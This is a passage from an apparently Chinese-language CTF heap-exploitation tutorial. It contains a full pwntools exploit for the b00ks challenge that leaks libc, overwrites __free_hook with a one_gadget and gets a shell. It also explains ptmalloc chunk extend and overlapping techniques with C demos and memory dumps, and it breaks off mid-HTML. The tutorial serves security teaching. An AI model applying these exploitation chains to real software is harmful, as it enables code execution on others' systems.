0x0000000000000000 r-x /home/vb/ 桌面 /123/123</span><br><span class="line">0x0000000000600000 0x0000000000601000 0x0000000000000000 r-- /home/vb/ 桌面 /123/123</span><br><span class="line">0x0000000000601000 0x0000000000602000 0x0000000000001000 rw- /home/vb/ 桌面 /123/123</span><br><span class="line">0x00007f8d638a3000 0x00007f8d63a63000 0x0000000000000000 r-x /lib/x86_64-linux-gnu/libc-2.23.so</span><br><span class="line">0x00007f8d63a63000 0x00007f8d63c63000 0x00000000001c0000 --- /lib/x86_64-linux-gnu/libc-2.23.so</span><br><span class="line">0x00007f8d63c63000 0x00007f8d63c67000 0x00000000001c0000 r-- /lib/x86_64-linux-gnu/libc-2.23.so</span><br><span class="line">0x00007f8d63c67000 0x00007f8d63c69000 0x00000000001c4000 rw- /lib/x86_64-linux-gnu/libc-2.23.so</span><br><span class="line">0x00007f8d63c69000 0x00007f8d63c6d000 0x0000000000000000 rw-</span><br><span class="line">0x00007f8d63c6d000 0x00007f8d63c93000 0x0000000000000000 r-x /lib/x86_64-linux-gnu/ld-2.23.so</span><br><span class="line">0x00007f8d63e54000 0x00007f8d63e79000 0x0000000000000000 rw- &lt;=== mmap</span><br><span class="line">0x00007f8d63e92000 0x00007f8d63e93000 0x0000000000025000 r-- /lib/x86_64-linux-gnu/ld-2.23.so</span><br><span class="line">0x00007f8d63e93000 0x00007f8d63e94000 0x0000000000026000 rw- /lib/x86_64-linux-gnu/ld-2.23.so</span><br><span class="line">0x00007f8d63e94000 0x00007f8d63e95000 0x0000000000000000 rw-</span><br><span class="line">0x00007ffdc4f12000 0x00007ffdc4f33000 0x0000000000000000 rw- [stack]</span><br><span class="line">0x00007ffdc4f7a000 0x00007ffdc4f7d000 0x0000000000000000 r-- [vvar]</span><br><span class="line">0x00007ffdc4f7d000 0x00007ffdc4f7f000 0x0000000000000000 r-x [vdso]</span><br><span class="line">0xffffffffff600000 0xffffffffff601000 0x0000000000000000 r-x [vsyscall]</span><br></pre></td></tr></table></figure><p>完整exp</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&quot;info&quot;</span></span><br><span class="line"></span><br><span class="line">binary = ELF(<span class="string">&quot;b00ks&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line">io = process(<span class="string">&quot;./b00ks&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">createbook</span>(<span class="params">name_size, name, des_size, des</span>):</span><br><span class="line">    io.readuntil(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    io.readuntil(<span class="string">&quot;: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(name_size))</span><br><span class="line">    io.readuntil(<span class="string">&quot;: &quot;</span>)</span><br><span class="line">    io.sendline(name)</span><br><span class="line">    io.readuntil(<span class="string">&quot;: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(des_size))</span><br><span class="line">    io.readuntil(<span class="string">&quot;: &quot;</span>)</span><br><span class="line">    io.sendline(des)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">printbook</span>(<span class="params"><span class="built_in">id</span></span>):</span><br><span class="line">    io.readuntil(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">&quot;4&quot;</span>)</span><br><span class="line">    io.readuntil(<span class="string">&quot;: &quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">id</span>):</span><br><span class="line">        book_id = <span class="built_in">int</span>(io.readline()[:-<span class="number">1</span>])</span><br><span class="line">        io.readuntil(<span class="string">&quot;: &quot;</span>)</span><br><span class="line">        book_name = io.readline()[:-<span class="number">1</span>]</span><br><span class="line">        io.readuntil(<span class="string">&quot;: &quot;</span>)</span><br><span class="line">        book_des = io.readline()[:-<span class="number">1</span>]</span><br><span class="line">        io.readuntil(<span class="string">&quot;: &quot;</span>)</span><br><span class="line">        book_author = io.readline()[:-<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">return</span> book_id, book_name, book_des, book_author</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">createname</span>(<span class="params">name</span>):</span><br><span class="line">    io.readuntil(<span class="string">&quot;name: &quot;</span>)</span><br><span class="line">    io.sendline(name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">changename</span>(<span class="params">name</span>):</span><br><span class="line">    io.readuntil(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">&quot;5&quot;</span>)</span><br><span class="line">    io.readuntil(<span class="string">&quot;: &quot;</span>)</span><br><span class="line">    io.sendline(name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">editbook</span>(<span class="params">book_id, new_des</span>):</span><br><span class="line">    io.readuntil(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">    io.readuntil(<span class="string">&quot;: &quot;</span>)</span><br><span class="line">    io.writeline(<span class="built_in">str</span>(book_id))</span><br><span class="line">    io.readuntil(<span class="string">&quot;: &quot;</span>)</span><br><span class="line">    io.sendline(new_des)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">deletebook</span>(<span class="params">book_id</span>):</span><br><span class="line">    io.readuntil(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">    io.readuntil(<span class="string">&quot;: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(book_id))</span><br><span class="line"></span><br><span class="line">createname(<span class="string">&quot;A&quot;</span> * <span class="number">32</span>)</span><br><span class="line">createbook(<span class="number">128</span>, <span class="string">&quot;a&quot;</span>, <span class="number">32</span>, <span class="string">&quot;a&quot;</span>)</span><br><span class="line">createbook(<span class="number">0x21000</span>, <span class="string">&quot;a&quot;</span>, <span class="number">0x21000</span>, <span class="string">&quot;b&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">book_id_1, book_name, book_des, book_author = printbook(<span class="number">1</span>)</span><br><span class="line">book1_addr = u64(book_author[<span class="number">32</span>:<span class="number">32</span>+<span class="number">6</span>].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">log.success(<span class="string">&quot;book1_address:&quot;</span> + <span class="built_in">hex</span>(book1_addr))</span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">1</span>) + p64(book1_addr + <span class="number">0x38</span>) + p64(book1_addr + <span class="number">0x40</span>) + p64(<span class="number">0xffff</span>)</span><br><span class="line">editbook(book_id_1, payload)</span><br><span class="line">changename(<span class="string">&quot;A&quot;</span> * <span class="number">32</span>)</span><br><span class="line"></span><br><span class="line">book_id_1, book_name, book_des, book_author = printbook(<span class="number">1</span>)</span><br><span class="line">book2_name_addr = u64(book_name.ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">book2_des_addr = u64(book_des.ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">log.success(<span class="string">&quot;book2 name addr:&quot;</span> + <span class="built_in">hex</span>(book2_name_addr))</span><br><span class="line">log.success(<span class="string">&quot;book2 des addr:&quot;</span> + <span class="built_in">hex</span>(book2_des_addr))</span><br><span class="line">libc_base = book2_des_addr - <span class="number">0x5b9010</span></span><br><span class="line">log.success(<span class="string">&quot;libc base:&quot;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">free_hook = libc_base + libc.symbols[<span class="string">&quot;__free_hook&quot;</span>]</span><br><span class="line">one_gadget = libc_base + <span class="number">0x4f322</span> <span class="comment"># 0x4f2c5 0x10a38c 0x4f322</span></span><br><span class="line">log.success(<span class="string">&quot;free_hook:&quot;</span> + <span class="built_in">hex</span>(free_hook))</span><br><span class="line">log.success(<span class="string">&quot;one_gadget:&quot;</span> + <span class="built_in">hex</span>(one_gadget))</span><br><span class="line">editbook(<span class="number">1</span>, p64(free_hook) * <span class="number">2</span>)</span><br><span class="line">editbook(<span class="number">2</span>, p64(one_gadget))</span><br><span class="line"></span><br><span class="line">deletebook(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h6 id="示例2：plaidctf-2015-plaiddb"><a href="#示例2：plaidctf-2015-plaiddb" class="headerlink" title="示例2：plaidctf 2015 plaiddb"></a>示例2：plaidctf 2015 plaiddb</h6><p>基本结构</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">struct Node&#123;</span><br><span class="line">void *key;</span><br><span class="line">long data_size;</span><br><span class="line">void *data;</span><br><span class="line">struct Node *left;</span><br><span class="line">    struct Node *right;</span><br><span class="line">    long dummy;</span><br><span class="line">    long dummy1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="double-free"><a href="#double-free" class="headerlink" title="double_free"></a>double_free</h4><h4 id="Chunk-Extend-and-Overlapping"><a href="#Chunk-Extend-and-Overlapping" class="headerlink" title="Chunk Extend and Overlapping"></a>Chunk Extend and Overlapping</h4><h5 id="介绍：-1"><a href="#介绍：-1" class="headerlink" title="介绍："></a>介绍：</h5><p>chunk extend 是堆漏洞的一种常见利用手法，通过 extend 可以实现 chunk overlapping 的效果。这种利用方法需要以下的时机和条件：</p><ul><li>程序中存在基于堆的漏洞</li><li>漏洞可以控制 chunk header 中的数据</li></ul><h5 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h5><p>chunk extend 技术能够产生的原因在于 ptmalloc 在对堆 chunk 进行操作时使用的各种宏。</p><p>在 ptmalloc 中，获取 chunk 块大小的操作如下 </p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Get size, ignoring use bits </span></span><br><span class="line"><span class="comment">计算一个给定指针 p 所指向的内存块（chunk）的大小。同时忽略了特定用途的位</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> chunksize(p) (chunksize_nomask(p) &amp; ~(SIZE_BITS))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Like chunksize, but do not mask SIZE_BITS. </span></span><br><span class="line"><span class="comment">没有忽略特定的比特位</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> chunksize_nomask(p) ((p)-&gt;mchunk_size)</span></span><br></pre></td></tr></table></figure><p>一种是直接获取 chunk 的大小，不忽略掩码部分，另外一种是忽略掩码部分。</p><p>在 ptmalloc 中，获取下一 chunk 块地址的操作如下 </p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Ptr to next physical malloc_chunk. */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> next_chunk(p) ((mchunkptr)(((char *) (p)) + chunksize(p)))</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">((char *) (p))：这部分代码将指针 p 转换为 char * 类型。这是因为 char 类型的大小被定义为 1 字节，所以这种转换允许我们以字节为单位进行指针算术运算。</span></span><br><span class="line"><span class="comment">((mchunkptr) ...):这部分代码将前面的计算结果转换回 mchunkptr 类型，以便它可以被用作指向下一个内存块的指针。</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><p>即使用当前块指针加上当前块大小。</p><p>在 ptmalloc 中，获取前一个 chunk 信息的操作如下 </p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Size of the chunk below P.  Only valid if prev_inuse (P).  */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> prev_size(p) ((p)-&gt;mchunk_prev_size)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Ptr to previous physical malloc_chunk.  Only valid if prev_inuse (P).  */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> prev_chunk(p) ((mchunkptr)(((char *) (p)) - prev_size(p)))</span></span><br></pre></td></tr></table></figure><p>即通过 malloc_chunk-&gt;prev_size 获取前一块大小，然后使用本 chunk 地址减去所得大小。</p><p>在 ptmalloc，判断当前 chunk 是否是 use 状态的操作如下： </p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> inuse(p)</span></span><br><span class="line">    ((((mchunkptr)(((<span class="type">char</span> *) (p)) + chunksize(p)))-&gt;mchunk_size) &amp; PREV_INUSE)</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">PREV_INUSE位于chunk_size中</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><p>即查看下一 chunk 的 prev_inuse 域，而下一块地址又如我们前面所述是根据当前 chunk 的 size 计算得出的。</p><p>通过上面几个宏可以看出，ptmalloc 通过 chunk header 的数据判断 chunk 的使用情况和对 chunk  的前后块进行定位。简而言之，chunk extend 就是通过控制 size 和 pre_size 域来实现跨越块操作从而导致  overlapping 的。</p><p>与 chunk extend 类似的还有一种称为 chunk shrink 的操作。</p><h5 id="示例1：对-inuse-的-fastbin-进行-extend"><a href="#示例1：对-inuse-的-fastbin-进行-extend" class="headerlink" title="示例1：对 inuse 的 fastbin 进行 extend"></a>示例1：对 inuse 的 fastbin 进行 extend</h5><p>简单来说，该利用的效果是通过更改第一个块的大小来控制第二个块的内容。 <strong>注意，我们的示例都是在 64 位的程序。如果想在 32 位下进行测试，可以把 8 字节偏移改为 4 字节</strong>。 </p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">void</span> *ptr,*ptr1;</span><br><span class="line"></span><br><span class="line">    ptr=<span class="built_in">malloc</span>(<span class="number">0x10</span>);<span class="comment">//分配第一个0x10的chunk</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>);<span class="comment">//分配第二个0x10的chunk</span></span><br><span class="line"></span><br><span class="line">    *(<span class="type">long</span> <span class="type">long</span> *)((<span class="type">long</span> <span class="type">long</span>)ptr<span class="number">-0x8</span>)=<span class="number">0x41</span>;<span class="comment">// 修改第一个块的size域</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(ptr);</span><br><span class="line">    ptr1=<span class="built_in">malloc</span>(<span class="number">0x30</span>);<span class="comment">// 实现 extend，控制了第二个块的内容</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当两个 malloc 语句执行之后，堆的内存分布如下 </p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x602000:   0x0000000000000000  0x0000000000000021 &lt;=== chunk 1</span><br><span class="line">0x602010:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602020:   0x0000000000000000  0x0000000000000021 &lt;=== chunk 2</span><br><span class="line">0x602030:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602040:   0x0000000000000000  0x0000000000020fc1 &lt;=== top chunk</span><br></pre></td></tr></table></figure><p>之后，我们把 chunk1 的 size 域更改为 0x41，0x41 是因为 chunk 的 size 域包含了用户控制的大小和 header 的大小。如上所示正好大小为 0x40。在题目中这一步可以由堆溢出得到。 </p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x602000:   0x0000000000000000  0x0000000000000041 &lt;=== 篡改大小</span><br><span class="line">0x602010:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602020:   0x0000000000000000  0x0000000000000021</span><br><span class="line">0x602030:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602040:   0x0000000000000000  0x0000000000020fc1 </span><br></pre></td></tr></table></figure><p>执行 free 之后，我们可以看到 chunk2 与 chunk1 合成一个 0x40 大小的 chunk，一起释放了。 </p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Fastbins[idx=0, size=0x10] 0x00</span><br><span class="line">Fastbins[idx=1, size=0x20] 0x00</span><br><span class="line">Fastbins[idx=2, size=0x30]  ←  Chunk(addr=0x602010, size=0x40, flags=PREV_INUSE) </span><br><span class="line">Fastbins[idx=3, size=0x40] 0x00</span><br><span class="line">Fastbins[idx=4, size=0x50] 0x00</span><br><span class="line">Fastbins[idx=5, size=0x60] 0x00</span><br><span class="line">Fastbins[idx=6, size=0x70] 0x00</span><br></pre></td></tr></table></figure><p>之后我们通过 malloc(0x30) 得到 chunk1+chunk2 的块，此时就可以直接控制 chunk2 中的内容，我们也把这种状态称为 overlapping chunk。 </p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">call   0x400450 &lt;malloc@plt&gt;</span><br><span class="line">mov    QWORD PTR [rbp-0x8], rax</span><br><span class="line"></span><br><span class="line">rax = 0x602010</span><br></pre></td></tr></table></figure><h5 id="示例2-对-inuse-的-smallbin-进行-extend"><a href="#示例2-对-inuse-的-smallbin-进行-extend" class="headerlink" title="示例2:对 inuse 的 smallbin 进行 extend"></a>示例2:对 inuse 的 smallbin 进行 extend</h5><p>通过之前深入理解堆的实现部分的内容，我们得知处于 fastbin 范围的 chunk 释放后会被置入 fastbin 链表中，而不处于这个范围的 chunk 被释放后会被置于 unsorted bin 链表中。 以下这个示例中，我们使用 0x80  这个大小来分配堆（作为对比，fastbin 默认的最大的 chunk 可使用范围是 0x70） </p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    void *ptr,*ptr1;</span><br><span class="line"></span><br><span class="line">    ptr=malloc(0x80);//分配第一个 0x80 的chunk1</span><br><span class="line">    malloc(0x10); //分配第二个 0x10 的chunk2</span><br><span class="line">    malloc(0x10); //防止与top chunk合并</span><br><span class="line"></span><br><span class="line">    *(int *)((int)ptr-0x8)=0xb1;</span><br><span class="line">    free(ptr);</span><br><span class="line">    ptr1=malloc(0xa0);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在这个例子中，因为分配的 size 不处于 fastbin 的范围，因此在释放时如果与 top chunk 相连会导致和 top chunk 合并。所以我们需要额外分配一个 chunk，把释放的块与 top chunk 隔开。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x602000:   0x0000000000000000  0x00000000000000b1 &lt;===chunk1 篡改size域</span><br><span class="line">0x602010:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602020:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602030:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602040:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602050:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602060:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602070:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602080:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602090:   0x0000000000000000  0x0000000000000021 &lt;=== chunk2</span><br><span class="line">0x6020a0:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x6020b0:   0x0000000000000000  0x0000000000000021 &lt;=== 防止合并的chunk</span><br><span class="line">0x6020c0:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x6020d0:   0x0000000000000000  0x0000000000020f31 &lt;=== top chunk</span><br></pre></td></tr></table></figure><p>释放后，chunk1 把 chunk2 的内容吞并掉并一起置入 unsorted bin </p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x602000:   0x0000000000000000  0x00000000000000b1 &lt;=== 被放入unsorted bin</span><br><span class="line">0x602010:   0x00007ffff7dd1b78  0x00007ffff7dd1b78</span><br><span class="line">0x602020:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602030:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602040:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602050:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602060:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602070:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602080:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602090:   0x0000000000000000  0x0000000000000021</span><br><span class="line">0x6020a0:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x6020b0:   0x00000000000000b0  0x0000000000000020 &lt;=== 注意此处标记为空</span><br><span class="line">0x6020c0:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x6020d0:   0x0000000000000000  0x0000000000020f31 &lt;=== top chunk</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[+] unsorted_bins[0]: fw=0x602000, bk=0x602000</span><br><span class="line"> →   Chunk(addr=0x602010, size=0xb0, flags=PREV_INUSE)</span><br></pre></td></tr></table></figure><p>再次进行分配的时候就会取回 chunk1 和 chunk2 的空间，此时我们就可以控制 chunk2 中的内容</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">    0x4005b0 &lt;main+74&gt;        call   0x400450 &lt;malloc@plt&gt;</span><br><span class="line">→   0x4005b5 &lt;main+79&gt;        mov    QWORD PTR [rbp-0x8], rax</span><br><span class="line"></span><br><span class="line">    rax : 0x0000000000602010</span><br></pre></td></tr></table></figure><h5 id="示例3：对-free-的-smallbin-进行-extend"><a href="#示例3：对-free-的-smallbin-进行-extend" class="headerlink" title="示例3：对 free 的 smallbin 进行 extend"></a>示例3：对 free 的 smallbin 进行 extend</h5><p>示例 3 是在示例 2 的基础上进行的，这次我们先释放 chunk1，然后再修改处于 unsorted bin 中的 chunk1 的 size 域。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">void</span> *ptr,*ptr1;</span><br><span class="line"></span><br><span class="line">    ptr=<span class="built_in">malloc</span>(<span class="number">0x80</span>);<span class="comment">//分配第一个0x80的chunk1</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>);<span class="comment">//分配第二个0x10的chunk2</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(ptr);<span class="comment">//首先进行释放，使得chunk1进入unsorted bin</span></span><br><span class="line"></span><br><span class="line">    *(<span class="type">int</span> *)((<span class="type">int</span>)ptr<span class="number">-0x8</span>)=<span class="number">0xb1</span>;</span><br><span class="line">    ptr1=<span class="built_in">malloc</span>(<span class="number">0xa0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>两次 malloc 之后的结果如下 </p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x602000:   0x0000000000000000  0x0000000000000091 &lt;=== chunk 1</span><br><span class="line">0x602010:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602020:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602030:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602040:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602050:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602060:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602070:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602080:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602090:   0x0000000000000000  0x0000000000000021 &lt;=== chunk 2</span><br><span class="line">0x6020a0:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x6020b0:   0x0000000000000000  0x0000000000020f51</span><br></pre></td></tr></table></figure><p>我们首先释放 chunk1 使它进入 unsorted bin 中 </p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">     unsorted_bins[0]: fw=0x602000, bk=0x602000</span><br><span class="line"> →   Chunk(addr=0x602010, size=0x90, flags=PREV_INUSE)</span><br><span class="line"></span><br><span class="line">0x602000:   0x0000000000000000  0x0000000000000091 &lt;=== 进入unsorted bin</span><br><span class="line">0x602010:   0x00007ffff7dd1b78  0x00007ffff7dd1b78</span><br><span class="line">0x602020:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602030:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602040:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602050:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602060:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602070:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602080:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602090:   0x0000000000000090  0x0000000000000020 &lt;=== chunk 2</span><br><span class="line">0x6020a0:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x6020b0:   0x0000000000000000  0x0000000000020f51 &lt;=== top chunk</span><br></pre></td></tr></table></figure><p>然后篡改 chunk1 的 size 域 </p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x602000:   0x0000000000000000  0x00000000000000b1 &lt;=== size域被篡改</span><br><span class="line">0x602010:   0x00007ffff7dd1b78  0x00007ffff7dd1b78</span><br><span class="line">0x602020:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602030:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602040:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602050:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602060:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602070:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602080:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602090:   0x0000000000000090  0x0000000000000020</span><br><span class="line">0x6020a0:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x6020b0:   0x0000000000000000  0x0000000000020f51</span><br></pre></td></tr></table></figure><p>此时再进行 malloc 分配就可以得到 chunk1+chunk2 的堆块，从而控制了 chunk2 的内容。</p><h5 id="示例4：通过-extend-后向-overlapping"><a href="#示例4：通过-extend-后向-overlapping" class="headerlink" title="示例4：通过 extend 后向 overlapping"></a>示例4：通过 extend 后向 overlapping</h5><p>这里展示通过 extend 进行后向 overlapping，这也是在 CTF 中最常出现的情况，通过 overlapping 可以实现其它的一些利用。 </p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">void</span> *ptr,*ptr1;</span><br><span class="line"></span><br><span class="line">    ptr=<span class="built_in">malloc</span>(<span class="number">0x10</span>);<span class="comment">//分配第1个 0x80 的chunk1</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>); <span class="comment">//分配第2个 0x10 的chunk2</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>); <span class="comment">//分配第3个 0x10 的chunk3</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>); <span class="comment">//分配第4个 0x10 的chunk4    </span></span><br><span class="line">    *(<span class="type">int</span> *)((<span class="type">int</span>)ptr<span class="number">-0x8</span>)=<span class="number">0x61</span>;</span><br><span class="line">    <span class="built_in">free</span>(ptr);</span><br><span class="line">    ptr1=<span class="built_in">malloc</span>(<span class="number">0x50</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在 malloc(0x50) 对 extend 区域重新占位后，其中 0x10 的 fastbin 块依然可以正常的分配和释放，此时已经构成 overlapping，通过对 overlapping 的进行操作可以实现 fastbin attack。</p><h5 id="示例5：通过-extend-前向-overlapping"><a href="#示例5：通过-extend-前向-overlapping" class="headerlink" title="示例5：通过 extend 前向 overlapping"></a>示例5：通过 extend 前向 overlapping</h5><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">void</span> *ptr1,*ptr2,*ptr3,*ptr4;</span><br><span class="line">    ptr1=<span class="built_in">malloc</span>(<span class="number">128</span>);<span class="comment">//smallbin1</span></span><br><span class="line">    ptr2=<span class="built_in">malloc</span>(<span class="number">0x10</span>);<span class="comment">//fastbin1</span></span><br><span class="line">    ptr3=<span class="built_in">malloc</span>(<span class="number">0x10</span>);<span class="comment">//fastbin2</span></span><br><span class="line">    ptr4=<span class="built_in">malloc</span>(<span class="number">128</span>);<span class="comment">//smallbin2</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>);<span class="comment">//防止与top合并</span></span><br><span class="line">    <span class="built_in">free</span>(ptr1);</span><br><span class="line">    *(<span class="type">int</span> *)((<span class="type">long</span> <span class="type">long</span>)ptr4<span class="number">-0x8</span>)=<span class="number">0x90</span>;<span class="comment">//修改pre_inuse域</span></span><br><span class="line">    *(<span class="type">int</span> *)((<span class="type">long</span> <span class="type">long</span>)ptr4<span class="number">-0x10</span>)=<span class="number">0xd0</span>;<span class="comment">//修改pre_size域</span></span><br><span class="line">    <span class="built_in">free</span>(ptr4);<span class="comment">//unlink进行前向extend</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x150</span>);<span class="comment">//占位块</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>前向 extend 利用了 smallbin 的 unlink 机制，通过修改 pre_size 域可以跨越多个 chunk 进行合并实现 overlapping。</p><h5 id="例题1-HITCON-Training-lab13"><a href="#例题1-HITCON-Training-lab13" class="headerlink" title="例题1 HITCON Training lab13"></a>例题1 HITCON Training lab13</h5><p>堆的结构如下：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span 